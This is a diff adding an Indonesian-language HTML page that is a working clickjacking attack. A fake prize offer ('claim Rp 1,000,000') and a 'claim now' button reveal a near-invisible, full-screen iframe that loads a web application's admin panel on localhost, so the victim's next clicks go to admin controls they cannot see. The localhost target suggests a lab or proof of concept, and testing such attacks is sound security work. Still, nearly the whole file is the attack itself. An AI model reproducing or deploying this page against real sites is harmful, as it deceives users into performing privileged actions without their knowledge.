@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hadiah Menarik Menanti Anda!</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      font-family: sans-serif;
+      background-color: #f8f9fa;
+    }
+
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      opacity: 0.01;
+      z-index: 2;
+      border: none;
+      display: none; /* ← Tambahkan: awalnya disembunyikan */
+    }
+
+    .fake-button {
+      position: absolute;
+      top: 70%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 3;
+      padding: 20px 40px;
+      font-size: 20px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    }
+
+    h1 {
+      text-align: center;
+      margin-top: 80px;
+      z-index: 4;
+      position: relative;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Klik tombol di bawah untuk klaim hadiah Rp 1.000.000!</h1>
+  <button class="fake-button" onclick="showIframe()">KLAIM SEKARANG</button>
+
+  <!-- Iframe awalnya disembunyikan -->
+  <iframe id="hiddenFrame" src="http://localhost:8080/index.php/admin/index"></iframe>
+
+  <script>
+    function showIframe() {
+      document.getElementById('hiddenFrame').style.display = 'block';
+    }
+  </script>
+
+</body>
+</html>
